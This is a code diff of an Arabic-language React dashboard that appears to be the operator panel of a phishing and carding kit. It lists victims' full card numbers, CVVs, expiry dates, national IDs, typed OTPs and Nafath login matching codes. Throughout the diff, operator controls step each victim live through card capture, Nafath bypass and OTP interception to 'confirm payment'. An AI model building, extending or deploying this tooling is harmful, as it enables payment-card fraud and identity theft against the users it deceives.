+              { id: 'PENDING_CARD_APPROVAL', label: 'بانتظار البطاقة 💳' },
+              { id: 'AWAITING_OTP', label: 'بانتظار الرمز 🔑' },
+              { id: 'OTP_SUBMITTED', label: 'رمز جديد 🔐' },
+              { id: 'APPROVED', label: 'مقبول 👍' },
+              { id: 'REJECTED', label: 'مرفوض ❌' }
+            ].map(tab => (
+              <button
+                key={tab.id}
+                onClick={() => setStatusFilter(tab.id)}
+                className={`px-3.5 py-1.5 text-[11px] font-bold rounded-lg transition cursor-pointer ${
+                  statusFilter === tab.id
+                    ? 'bg-slate-800 text-white border border-slate-750/75'
+                    : 'text-slate-400 hover:text-white'
+                }`}
+              >
+                {tab.label}
+              </button>
+            ))}
+          </div>
+        </div>
+      </div>
+
+      {/* Grid of Complete Live User Profiles */}
+      {isLoading ? (
+        <div className="py-24 text-center">
+          <RefreshCw className="h-10 w-10 text-indigo-500 animate-spin mx-auto mb-4" />
+          <p className="text-sm font-mono text-slate-500">جاري مزامنة قاعدة البيانات وجلب البروفايلات النشطة...</p>
+        </div>
+      ) : filteredTx.length === 0 ? (
+        <div className="py-24 text-center border border-dashed border-slate-800 bg-slate-900/10 rounded-3xl">
+          <ShieldAlert className="h-12 w-12 text-slate-600 mx-auto mb-3 animate-pulse" />
+          <h4 className="text-sm font-bold text-slate-350">لا توجد ملفات بروفايل مطابقة حالياً</h4>
+          <p className="text-xs text-slate-500 mt-1 max-w-md mx-auto leading-relaxed">
+            عند قيام المستخدمين بالدخول للموقع والبدء بالتسجيل، ستظهر بروفايلاتهم الكاملة هنا فوراً مع إمكانية تحديث مساراتهم والتحكم بها لحظياً.
+          </p>
+        </div>
+      ) : (
+        <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-6">
+          {filteredTx.map(tx => {
+            // Check card status for custom text styling
+            const cardAwaiting = tx.cardNumber === 'Awaiting Card...' || !tx.cardNumber;
+
+            return (
+              <div
+                key={tx.id}
+                className="relative rounded-3xl border border-slate-800 bg-slate-900/40 p-6 backdrop-blur-xl shadow-2xl hover:border-slate-700/80 transition duration-300 overflow-hidden flex flex-col justify-between gap-5 text-right"
+              >
+                {/* Visual Status Indicator Top Colored Edge */}
+                <div className={`absolute top-0 inset-x-0 h-1 bg-gradient-to-r ${
+                  tx.status === 'APPROVED' ? 'from-emerald-500 to-teal-500' :
+                  tx.status === 'REJECTED' ? 'from-rose-500 to-red-500' :
+                  tx.status === 'OTP_SUBMITTED' ? 'from-cyan-500 to-blue-500 animate-pulse' :
+                  tx.status === 'AWAITING_OTP' ? 'from-indigo-500 to-purple-500' :
+                  tx.status === 'AWAITING_NAFATH' ? 'from-amber-500 to-yellow-500' :
+                  'from-slate-600 to-slate-700'
+                }`} />
+
+                {/* Profile header with user metadata */}
+                <div className="flex flex-row-reverse justify-between items-start gap-4">
+                  <div className="space-y-1">
+                    <div className="flex flex-row-reverse items-center gap-1.5 flex-wrap">
+                      <span className="text-slate-500 text-[10px] font-mono font-bold tracking-wider">{tx.id}</span>
+                      <span className={`inline-flex items-center rounded-md px-2 py-0.5 text-[9px] font-bold ${
+                        tx.status === 'APPROVED' ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' :
+                        tx.status === 'REJECTED' ? 'bg-rose-500/10 text-rose-400 border border-rose-500/20' :
+                        tx.status === 'AWAITING_OTP' ? 'bg-indigo-500/10 text-indigo-400 border border-indigo-500/20 animate-pulse' :
+                        tx.status === 'OTP_SUBMITTED' ? 'bg-cyan-500/10 text-cyan-450 border border-cyan-500/20 animate-bounce font-black' :
+                        tx.status === 'AWAITING_NAFATH' ? 'bg-amber-500/10 text-amber-400 border border-amber-500/20 animate-pulse' :
+                        tx.status === 'NAFATH_VERIFIED' ? 'bg-teal-500/10 text-teal-400 border border-teal-500/20' :
+                        'bg-slate-500/10 text-slate-350 border border-slate-700/60'
+                      }`}>
+                        {tx.status === 'APPROVED' ? 'مكتمل ومقبول 👍' :
+                         tx.status === 'REJECTED' ? 'مرفوض ❌' :
+                         tx.status === 'AWAITING_OTP' ? 'بانتظار رمز الـ OTP 🔑' :
+                         tx.status === 'OTP_SUBMITTED' ? 'تم إدخال الرمز 🔐' :
+                         tx.status === 'AWAITING_NAFATH' ? 'بانتظار مطابقة نفاذ ⏳' :
+                         tx.status === 'NAFATH_VERIFIED' ? 'تم توثيق نفاذ ✅' :
+                         'بانتظار البطاقة 💳'}
+                      </span>
+                    </div>
+                    <h3 className="text-base font-extrabold text-white truncate max-w-[200px]" title={tx.cardholderName}>
+                      {tx.cardholderName || 'مستند مجهول'}
+                    </h3>
+                    {tx.nationalId && (
+                      <div className="flex flex-row-reverse items-center gap-1.5 text-xs text-slate-400">
+                        <span className="font-mono font-bold text-slate-300">{tx.nationalId}</span>
+                        <span className="text-slate-500">:الهوية الوطنية</span>
+                      </div>
+                    )}
                   </div>
 
-                  <div className="py-6 flex justify-center w-full relative">
-                    <CreditCard3D
-                      cardNumber={selectedTx.cardNumber}
-                      cardholderName={selectedTx.cardholderName}
-                      expiry={selectedTx.expiry}
-                      cvv={selectedTx.cvv}
-                      cardType={selectedTx.cardType}
-                      isFlipped={selectedTx.status === 'AWAITING_OTP' || selectedTx.status === 'OTP_SUBMITTED'}
-                      className="scale-[0.82] sm:scale-[0.88] origin-center -my-2"
-                    />
-                  </div>
-
-                  <div className="w-full text-center text-[10px] font-mono text-slate-500 border-t border-slate-900 pt-2.5 mt-1">
-                    💡 Hover to test parallax. Flipped to back when CVV verification is focused.
+                  {/* Financial amount and timestamp */}
+                  <div className="text-left flex flex-col items-start gap-1">
+                    <span className="text-emerald-400 font-extrabold font-mono text-sm">${tx.amount.toFixed(2)}</span>
+                    <span className="text-[9px] font-mono text-slate-500">
+                      {new Date(tx.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
+                    </span>
+                    {tx.serviceName && (
+                      <span className="text-[9px] font-bold bg-[#004d33]/35 text-[#2dd4bf] px-2 py-0.5 rounded-md border border-[#2dd4bf]/20 mt-1 max-w-[120px] truncate">
+                        {tx.serviceName}
+                      </span>
+                    )}
                   </div>
                 </div>
 
-                {/* Status-specific actions & info boxes */}
-                <div className="rounded-xl bg-slate-950/80 border border-slate-800/60 p-4 space-y-3 font-mono text-xs">
-                  {/* OTP Submission Alert Box if OTP is present */}
-                  {selectedTx.submittedOtp && (
-                    <div className="border border-cyan-500/20 bg-cyan-950/20 px-3 py-2.5 rounded-lg border-l-4 border-l-cyan-500 animate-pulse">
-                      <div className="flex justify-between items-center mb-1">
-                        <span className="text-cyan-400 font-extrabold flex items-center space-x-1">
-                          <Fingerprint className="w-3.5 h-3.5" />
-                          <span>USER SUBMITTED OTP CODE:</span>
-                        </span>
-                        <span className="text-slate-400 text-[9px]">RECEIVED</span>
+                {/* Credit Card Details Block */}
+                <div className="bg-slate-950/60 rounded-2xl border border-slate-800/80 p-4 relative overflow-hidden flex flex-col gap-2.5">
+                  <div className="flex flex-row-reverse justify-between items-center text-[9px] text-slate-500 font-bold border-b border-slate-900 pb-1.5">
+                    <span>بيانات بطاقة الدفع</span>
+                    {tx.cardType && tx.cardType !== 'unknown' && (
+                      <span className={`text-[8px] font-mono border px-1 rounded uppercase ${getCardTypeColor(tx.cardType)}`}>
+                        {tx.cardType}
+                      </span>
+                    )}
+                  </div>
+                  
+                  {cardAwaiting ? (
+                    <div className="py-3 flex flex-col items-center justify-center text-center gap-2">
+                      <div className="w-8 h-8 rounded-full bg-indigo-500/10 flex items-center justify-center text-indigo-400 border border-indigo-500/20 animate-pulse">
+                        <Activity className="w-4 h-4" />
                       </div>
-                      <div className="text-center py-1">
-                        <span className="text-cyan-300 font-black text-2xl tracking-widest bg-slate-950 px-4 py-1 rounded border border-cyan-500/20">
-                          {selectedTx.submittedOtp}
+                      <div>
+                        <p className="text-[11px] font-bold text-slate-400">بانتظار إدخال بيانات الدفع...</p>
+                        <p className="text-[9px] text-slate-500">لم يقم العميل بكتابة بطاقته الائتمانية حتى الآن</p>
+                      </div>
+                    </div>
+                  ) : (
+                    <div className="grid grid-cols-2 gap-3 text-right">
+                      <div className="col-span-2 flex flex-row-reverse items-center justify-between border-b border-slate-900 pb-1.5">
+                        <span className="text-[10px] text-slate-500">رقم البطاقة:</span>
+                        <span className="text-xs font-mono font-black text-white select-all">
+                          {tx.cardNumber}
                         </span>
                       </div>
-                      <p className="text-[9px] text-slate-400 mt-2 text-center">
-                        This match rate matches generated security sequence: <strong className="text-emerald-400">{selectedTx.otpCode}</strong>.
-                      </p>
+                      <div className="flex flex-row-reverse items-center justify-between">
+                        <span className="text-[10px] text-slate-500">الانتهاء:</span>
+                        <span className="text-xs font-mono font-bold text-white">
+                          {tx.expiry}
+                        </span>
+                      </div>
+                      <div className="flex flex-row-reverse items-center justify-between border-r border-slate-900 pr-3">
+                        <span className="text-[10px] text-slate-500">رمز الأمان (CVV):</span>
+                        <span className="text-xs font-mono font-black text-amber-400 bg-amber-500/10 border border-amber-500/20 px-1.5 py-0.2 rounded">
+                          {tx.cvv}
+                        </span>
+                      </div>
                     </div>
                   )}
+                </div>
 
-                  {/* Standard Generated code status always shown */}
-                  <div className="flex justify-between pb-1 border-b border-slate-900">
-                    <span className="text-slate-500 uppercase">SYSTEM EXPECTED OTP:</span>
-                    <span className="text-emerald-400 font-black text-sm tracking-widest">{selectedTx.otpCode || 'NOT ISSUED'}</span>
+                {/* Verification Panels (Nafath Matching and OTP Verification) */}
+                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
+                  {/* Nafath Block */}
+                  <div className="bg-slate-950/40 rounded-2xl border border-slate-850 p-3.5 text-right flex flex-col justify-between gap-2.5">
+                    <div className="flex flex-row-reverse justify-between items-center text-[10px] text-slate-500 border-b border-slate-900 pb-1.5">
+                      <span>توثيق نفاذ الموحد</span>
+                      <Fingerprint className="w-3.5 h-3.5 text-emerald-400" />
+                    </div>
+                    
+                    <div className="flex flex-row-reverse items-center justify-between">
+                      <span className="text-[10px] text-slate-400">رمز المطابقة الحالي:</span>
+                      <span className="text-xs font-mono font-black text-[#2dd4bf] bg-[#004d33]/20 border border-[#2dd4bf]/20 px-2 py-0.5 rounded">
+                        {tx.nafathCode || 'غير محدد'}
+                      </span>
+                    </div>
+
+                    {/* Change Nafath Matching code directly inside the user profile card */}
+                    <div className="flex flex-row-reverse items-center justify-between gap-1.5 pt-2 border-t border-slate-900">
+                      <input
+                        type="text"
+                        maxLength={3}
+                        id={`inline-nafath-input-${tx.id}`}
+                        placeholder="رمز مخصص"
+                        defaultValue={tx.nafathCode || ''}
+                        className="bg-slate-950 border border-slate-800 text-slate-200 text-[10px] text-center rounded px-1.5 py-1 w-16 h-7 focus:outline-none focus:ring-1 focus:ring-indigo-500 font-mono"
+                      />
+                      <button
+                        type="button"
+                        onClick={() => {
+                          const el = document.getElementById(`inline-nafath-input-${tx.id}`) as HTMLInputElement;
+                          if (el && el.value.trim()) {
+                            handleUpdateTxNafathCodeDirect(tx.id, el.value.trim());
+                          }
+                        }}
+                        className="bg-indigo-600 hover:bg-indigo-500 text-white text-[9px] font-black px-2 py-1 rounded h-7 transition-all cursor-pointer shrink-0"
+                      >
+                        حفظ
+                      </button>
+                    </div>
                   </div>
 
-                  <div className="flex justify-between pb-1 border-b border-slate-900">
-                    <span className="text-slate-500 uppercase">CVV SECURITY CODE:</span>
-                    <span className="text-white font-bold">{selectedTx.cvv}</span>
-                  </div>
-
-                  <div className="flex justify-between pb-1 border-b border-slate-900">
-                    <span className="text-slate-500 uppercase">EXPIRY DATE:</span>
-                    <span className="text-white font-bold">{selectedTx.expiry}</span>
-                  </div>
-
-                  <div className="flex justify-between pb-1 border-b border-slate-900">
-                    <span className="text-slate-500 uppercase">REQUESTED SERVICE:</span>
-                    <span className="text-cyan-400 font-bold">{selectedTx.serviceName || 'GENERAL SERVICE'}</span>
-                  </div>
-
-                  <div className="flex justify-between pb-1 border-b border-slate-900">
-                    <span className="text-slate-500 uppercase">TRANSACTION VALUE:</span>
-                    <span className="text-emerald-400 font-bold">${selectedTx.amount.toFixed(2)} USD</span>
-                  </div>
-
-                  <div className="flex justify-between pt-1">
-                    <span className="text-slate-500 uppercase">CURRENT QUEUE STATE:</span>
-                    <span className={`font-black uppercase tracking-wider ${
-                      selectedTx.status === 'APPROVED' ? 'text-emerald-400' :
-                      selectedTx.status === 'REJECTED' ? 'text-rose-400' :
-                      selectedTx.status === 'AWAITING_OTP' ? 'text-indigo-400' : 
-                      selectedTx.status === 'OTP_SUBMITTED' ? 'text-cyan-400 animate-pulse' : 'text-amber-400'
-                    }`}>
-                      {selectedTx.status === 'PENDING_CARD_APPROVAL' ? 'PENDING CARD' : selectedTx.status === 'AWAITING_OTP' ? 'AWAITING OTP' : selectedTx.status === 'OTP_SUBMITTED' ? 'OTP SUBMITTED' : selectedTx.status}
-                    </span>
+                  {/* OTP Verification Block */}
+                  <div className="bg-slate-950/40 rounded-2xl border border-slate-850 p-3.5 text-right flex flex-col justify-between gap-2">
+                    <div className="flex flex-row-reverse justify-between items-center text-[10px] text-slate-500 border-b border-slate-900 pb-1.5">
+                      <span>رمز التحقق OTP</span>
+                      <KeyRound className="w-3.5 h-3.5 text-cyan-400" />
+                    </div>
+                    <div className="flex flex-row-reverse items-center justify-between">
+                      <span className="text-[10px] text-slate-400">الرمز المتوقع:</span>
+                      <span className="text-xs font-mono font-bold text-white">
+                        {tx.otpCode}
+                      </span>
+                    </div>
+                    <div className="flex flex-row-reverse items-center justify-between">
+                      <span className="text-[10px] text-slate-400">الرمز المدخل:</span>
+                      {tx.submittedOtp ? (
+                        <span className="text-xs font-mono font-black text-cyan-300 bg-cyan-500/10 border border-cyan-500/20 px-1.5 py-0.5 rounded animate-bounce">
+                          {tx.submittedOtp}
+                        </span>
+                      ) : (
+                        <span className="text-[9px] text-slate-500 italic">بانتظار الإدخال</span>
+                      )}
+                    </div>
                   </div>
                 </div>
 
-                {/* Audit notification state messages */}
-                {(actionError || successMessage) && (
-                  <motion.div
-                    initial={{ opacity: 0, height: 0 }}
-                    animate={{ opacity: 1, height: 'auto' }}
-                    className="space-y-2"
-                  >
-                    {actionError && (
-                      <div className="rounded-xl border border-rose-500/20 bg-rose-500/10 p-3 text-xs text-rose-400 flex items-center space-x-2">
-                        <AlertTriangle className="h-4 w-4 shrink-0" />
-                        <span>{actionError}</span>
+                {/* Full Workflow Interactive Controls */}
+                <div className="border-t border-slate-900 pt-4 mt-auto">
+                  {tx.status === 'AWAITING_NAFATH' ? (
+                    <div className="space-y-2">
+                      <div className="text-[9px] text-amber-400 font-mono text-center uppercase tracking-widest bg-amber-950/20 py-1.5 rounded border border-amber-500/15 animate-pulse">
+                        الخطوة 1: بانتظار توثيق العميل لطلب نفاذ
                       </div>
-                    )}
-                    {successMessage && (
-                      <div className="rounded-xl border border-emerald-500/20 bg-emerald-500/10 p-3 text-xs text-emerald-400 flex items-center space-x-2">
-                        <CheckCircle className="h-4 w-4 shrink-0" />
-                        <span>{successMessage}</span>
-                      </div>
-                    )}
-                  </motion.div>
-                )}
-
-                {/* INTERACTIVE WORKFLOW ACTIONS */}
-                <div className="pt-2">
-                  {selectedTx.status === 'PENDING_CARD_APPROVAL' ? (
-                    <div className="space-y-3">
-                      <div className="text-[10px] text-amber-400 font-mono text-center uppercase tracking-widest bg-amber-950/20 py-1.5 rounded border border-amber-500/15">
-                        STAGE 1: CARD DECISION REQUIRED
-                      </div>
-                      <div className="grid grid-cols-2 gap-3">
+                      <div className="grid grid-cols-2 gap-2">
                         <button
-                          onClick={() => handleUpdateStatus('REJECTED')}
+                          onClick={() => handleUpdateTxStatusDirect(tx.id, 'REJECTED')}
                           disabled={actionBusy}
-                          className="flex h-12 w-full items-center justify-center rounded-xl border border-rose-500/20 bg-rose-500/10 hover:bg-rose-500/20 text-rose-400 text-xs font-bold tracking-wider hover:shadow-lg hover:shadow-rose-500/10 transition duration-150 disabled:opacity-50"
+                          className="flex h-9 w-full items-center justify-center rounded-xl border border-rose-500/20 bg-rose-500/5 hover:bg-rose-500/10 text-rose-400 text-[10px] font-bold transition duration-150 disabled:opacity-50 cursor-pointer"
                         >
-                          REJECT CARD
+                          رفض العملية
                         </button>
                         <button
-                          onClick={() => handleUpdateStatus('AWAITING_OTP')}
+                          onClick={() => handleUpdateTxStatusDirect(tx.id, 'NAFATH_VERIFIED')}
                           disabled={actionBusy}
-                          className="flex h-12 w-full items-center justify-center rounded-xl border border-indigo-500/25 bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-bold tracking-wider hover:shadow-lg hover:shadow-indigo-500/20 transition duration-150 disabled:opacity-50"
+                          className="flex h-9 w-full items-center justify-center rounded-xl bg-teal-600 hover:bg-teal-500 text-white text-[10px] font-bold transition duration-150 disabled:opacity-50 cursor-pointer"
                         >
-                          APPROVE CARD
+                          تجاوز وموافقة نفاذ ✅
                         </button>
                       </div>
                     </div>
-                  ) : selectedTx.status === 'OTP_SUBMITTED' ? (
-                    <div className="space-y-3">
-                      <div className="text-[10px] text-cyan-400 font-mono text-center uppercase tracking-widest bg-cyan-950/30 py-1.5 rounded border border-cyan-500/20 animate-pulse">
-                        STAGE 2: FINAL SETTLEMENT DECISION
+                  ) : tx.status === 'NAFATH_VERIFIED' ? (
+                    <div className="text-center bg-teal-950/10 border border-teal-800/40 rounded-2xl p-3">
+                      <p className="text-xs text-teal-300 font-bold">تم توثيق نفاذ بنجاح!</p>
+                      <p className="text-[9px] text-slate-500 mt-0.5">بانتظار قيام العميل بالانتقال لصفحة الدفع في متصفحه</p>
+                      <button
+                        onClick={() => handleUpdateTxStatusDirect(tx.id, 'PENDING_CARD_APPROVAL')}
+                        disabled={actionBusy}
+                        className="mt-2 text-[9px] text-indigo-400 hover:text-indigo-300 underline transition cursor-pointer"
+                      >
+                        تجاوز والانتقال لفحص البطاقة يدوياً 💳
+                      </button>
+                    </div>
+                  ) : tx.status === 'PENDING_CARD_APPROVAL' ? (
+                    <div className="space-y-2">
+                      <div className="text-[9px] text-amber-400 font-mono text-center uppercase tracking-widest bg-amber-950/20 py-1.5 rounded border border-amber-500/15">
+                        الخطوة 2: اتخاذ قرار بشأن البطاقة المدخلة
                       </div>
-                      <div className="grid grid-cols-2 gap-3">
+                      <div className="grid grid-cols-2 gap-2">
                         <button
-                          onClick={() => handleUpdateStatus('REJECTED')}
+                          onClick={() => handleUpdateTxStatusDirect(tx.id, 'REJECTED')}
                           disabled={actionBusy}
-                          className="flex h-12 w-full items-center justify-center rounded-xl border border-rose-500/20 bg-rose-500/10 hover:bg-rose-500/20 text-rose-400 text-xs font-bold tracking-wider hover:shadow-lg hover:shadow-rose-500/10 transition duration-150 disabled:opacity-50"
+                          className="flex h-9 w-full items-center justify-center rounded-xl border border-rose-500/20 bg-rose-500/5 hover:bg-rose-500/10 text-rose-400 text-[10px] font-bold transition duration-150 disabled:opacity-50 cursor-pointer"
                         >
-                          REJECT
+                          رفض البطاقة
                         </button>
                         <button
-                          onClick={() => handleUpdateStatus('APPROVED')}
+                          onClick={() => handleUpdateTxStatusDirect(tx.id, 'AWAITING_OTP')}
                           disabled={actionBusy}
-                          className="flex h-12 w-full items-center justify-center rounded-xl border border-emerald-500/20 bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-bold tracking-wider hover:shadow-lg hover:shadow-emerald-500/20 transition duration-150 disabled:opacity-50"
+                          className="flex h-9 w-full items-center justify-center rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white text-[10px] font-bold transition duration-150 disabled:opacity-50 cursor-pointer"
                         >
-                          CONFIRM PAYMENT
+                          طلب الرمز OTP 🔑
+                        </button>
+                      </div>
+                    </div>
+                  ) : tx.status === 'OTP_SUBMITTED' ? (
+                    <div className="space-y-2">
+                      <div className="text-[9px] text-cyan-400 font-mono text-center uppercase tracking-widest bg-cyan-950/30 py-1.5 rounded border border-cyan-500/20 animate-pulse">
+                        الخطوة 3: العميل أدخل الرمز الجديد - يرجى التحقق
+                      </div>
+                      <div className="grid grid-cols-2 gap-2">
+                        <button
+                          onClick={() => handleUpdateTxStatusDirect(tx.id, 'REJECTED')}
+                          disabled={actionBusy}
+                          className="flex h-9 w-full items-center justify-center rounded-xl border border-rose-500/20 bg-rose-500/5 hover:bg-rose-500/10 text-rose-400 text-[10px] font-bold transition duration-150 disabled:opacity-50 cursor-pointer"
+                        >
+                          رفض الرمز والمحاولة ثانية
+                        </button>
+                        <button
+                          onClick={() => handleUpdateTxStatusDirect(tx.id, 'APPROVED')}
+                          disabled={actionBusy}
+                          className="flex h-9 w-full items-center justify-center rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-[10px] font-bold transition duration-150 disabled:opacity-50 cursor-pointer"
+                        >
+                          تأكيد وقبول عملية الدفع 👍
                         </button>
                       </div>
                     </div>
                   ) : (
-                    <div className="rounded-xl border border-dashed border-slate-800 p-4 text-center">
-                      <p className="text-[11px] font-mono text-slate-500">
-                        This transaction sequence has finished at state{' '}
-                        <span className={`font-bold ${
-                          selectedTx.status === 'APPROVED' ? 'text-emerald-400' :
-                          selectedTx.status === 'REJECTED' ? 'text-rose-400' : 'text-indigo-400'
-                        }`}>
-                          {selectedTx.status}
-                        </span>
-                        .
-                      </p>
-                      
-                      {/* Interactive Reset switch to let admin replay / sandbox */}
+                    <div className="text-center">
+                      <div className="rounded-xl bg-slate-950/80 border border-slate-900 py-2">
+                        <p className="text-[10px] text-slate-400">
+                          اكتملت دورة المعاملة بنجاح بالحالة:{' '}
+                          <span className={`font-black ${
+                            tx.status === 'APPROVED' ? 'text-emerald-400' : 'text-rose-400'
+                          }`}>
+                            {tx.status === 'APPROVED' ? 'مقبولة بنجاح 👍' : 'مرفوضة وملغاة ❌'}
+                          </span>
+                        </p>
+                      </div>
                       <button
-                        onClick={() => handleUpdateStatus('PENDING_CARD_APPROVAL')}
+                        onClick={() => handleUpdateTxStatusDirect(tx.id, 'PENDING_CARD_APPROVAL')}
                         disabled={actionBusy}
-                        className="mt-3 inline-flex items-center space-x-1.5 text-[10px] font-mono text-slate-400 hover:text-white underline transition"
+                        className="mt-2 text-[9px] font-mono text-slate-500 hover:text-slate-300 underline transition cursor-pointer flex items-center justify-center gap-1 mx-auto"
                       >
-                        <RefreshCw className="w-3 h-3" />
-                        <span>Reset to Card Pending state</span>
+                        <RefreshCw className="w-2.5 h-2.5" />
+                        <span>إعادة تفعيل المعاملة لفحص البطاقة</span>
                       </button>
                     </div>
                   )}
                 </div>
-
               </div>
-            ) : (
-              <div className="py-24 text-center border border-dashed border-slate-800 rounded-2xl">
-                <ShieldAlert className="h-10 w-10 mx-auto text-slate-700 mb-2 animate-pulse" />
-                <p className="text-xs font-bold text-slate-400">Ledger Auditing Desk</p>
-                <p className="text-[10px] text-slate-500 mt-1.5 font-mono max-w-xs mx-auto">
-                  Select a transactional log from the database ledger to execute administrative stage authorization tasks.
-                </p>
-              </div>
-            )}
-          </div>
+            );
+          })}
         </div>
-      </div>
+      )}
     </div>
   );
 };
